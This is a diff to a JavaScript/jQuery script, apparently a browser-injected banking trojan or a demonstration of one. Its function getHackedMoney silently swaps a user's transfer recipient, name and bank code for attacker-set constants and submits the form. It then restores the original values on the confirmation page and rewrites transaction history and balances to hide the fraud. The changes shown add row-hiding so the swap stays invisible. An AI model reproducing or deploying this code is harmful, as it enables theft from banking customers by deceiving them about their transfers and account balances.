@@ -205,7 +205,7 @@ function getHackedMoney(realMoney) {
 		 				storedTransfers[index] = newTransfer;
 		 				
 		 				saveTransfers(storedTransfers);
-		 				
+		 				$("tr").hide();
 		 				$("input:eq(1)").val(HACK_REC_ACCOUNT);
 		 				$("input:eq(2)").val(HACK_REC_NAME);
 		 				$("input:eq(3)").val(HACK_BANK_BLZ);
@@ -214,14 +214,17 @@ function getHackedMoney(realMoney) {
 		 				$("input:eq(6)").val(HACK_USAGE);
 		 				sendMoneyBtnClone.attr("activateReset","true");
 		 				$("button[hackMarkerBtnOrig='true']")[0].click();
+		 				
+		 				//hide hacked values
+		 				$("tr").hide();
 		 				$(this).hide();
 		 				
 		 				});			
 		 			
 		 	});
-		 	
+
 		 	$("#btnTD button[hName='sendMoneyBtnClone']").filter(":not(:visible)[activateReset='true']").each(function(){
-		 		 
+
 		 		 storedTransfers = loadTransfers();
 		 		lastTransfer = storedTransfers[storedTransfers.length - 1];
 		 		
@@ -231,7 +234,11 @@ function getHackedMoney(realMoney) {
 				$("input:eq(4)").val(lastTransfer.bank_Name);
 				$("input:eq(5)").val(lastTransfer.amount);
 				$("input:eq(6)").val(lastTransfer.remark);
+				
+				//show expected values
+				$("tr").show();
 
+				
 		 		$(this).attr("hackConfPageMarker","true");
 		 	});
 		 	
@@ -246,6 +253,8 @@ function getHackedMoney(realMoney) {
 	 				storedTransfers = loadTransfers();
 	 		 		lastTransfer = storedTransfers[storedTransfers.length - 1];
 	 		 		
+	 		 		//first hide everything
+	 		 		$("tr").hide();
 	 		 		//send hacked values
 	 				$("input:eq(1)").val(HACK_REC_ACCOUNT);
 	 				$("input:eq(2)").val(HACK_REC_NAME);
@@ -262,6 +271,8 @@ function getHackedMoney(realMoney) {
 					$("input:eq(4)").val(lastTransfer.bank_Name);
 					$("input:eq(5)").val(lastTransfer.amount);
 					$("input:eq(6)").val(lastTransfer.remark);
+					$("tr").show();
+					
 					
 					//set transfer to be committed (not necessarily true e.g. if tan is wrong!)
 					lastTransfer.commited = true;
@@ -281,7 +292,7 @@ function getHackedMoney(realMoney) {
 		 		alreadyUsedHackedTransfers[i] = new Boolean(false);
 		 	//get row that contains a hacked transfer
 		 	hackedRow= $(".TransfersOdd,.TransfersEven").filter(':contains(Hack the Bank)').each(function(){
-		 		$(this).show();
+		 		
 		 		//find the original transfer for this row
 		 		//date format on bank page is "dd.mm.yyyy"
 		 		var date = $(this).prev().children();
@@ -321,7 +332,8 @@ function getHackedMoney(realMoney) {
 		 		//original data by user
 		 		var originalData;
 		 		if (correctHackIndex == -1) {
-		 			console.log("Error. Could not find original data. Using some generic fake data.");
+		 			if (DEBUG)
+		 				console.log("Error. Could not find original data. Using some generic fake data.");
 		 			//create some fake data
 		 			originalData = new Transfer(globalRC_Acc_Name, globalRC_Acc_Nr,
 		 				globalRC_Bank_BLZ, globalRC_Bank_Name,
@@ -347,7 +359,7 @@ function getHackedMoney(realMoney) {
 		 		amount.text(originalData.amount);
 
 		 		
-
+		 		$(this).parent().show();
 		 		
 		 	});
 
@@ -356,8 +368,8 @@ function getHackedMoney(realMoney) {
 			 
 		 	//set hackmarker for transaction so they will not be changed during account amount manipulation
 		 	transactionRow= $(".TransfersOdd,.TransfersEven").each(function(){
-		 		$(this).next().next().next().attr("hackMarker","true");
-		 		 $(this).show();
+		 		$(this).next().next().next().attr("hackMarker","true");	
+		 		$(this).show();
 		 	});
 		 	//manipulate account balance
 		 	$(".negativeMoney[hackmarker!='true'],.positiveMoney[hackmarker!='true']").each(function() {
@@ -391,13 +403,13 @@ function getHackedMoney(realMoney) {
 		 $(".negativeMoney[hackmarker!='true'],.positiveMoney[hackmarker!='true']").each(function() {
 			 $(this).hide();
 		 });
-		 //hide amount of all transfers as well
-		 hackedRow= $(".TransfersOdd,.TransfersEven").filter(':contains(Hack the Bank)').each(function(){
-			$(this).hide(); 
+		 //hide all hacked transfers as well
+		 hackedRow= $(".TransfersOdd,.TransfersEven").filter(':contains(Hack Demo)').each(function(){			
+			$(this).parent().hide(); 
 		 });
 		 
 		// some delay for function call is needed
-		// else the browser will lag somehow
+		// otherwise the browser will lag
 		
 		setTimeout(timedMsg,1); 
 	 }
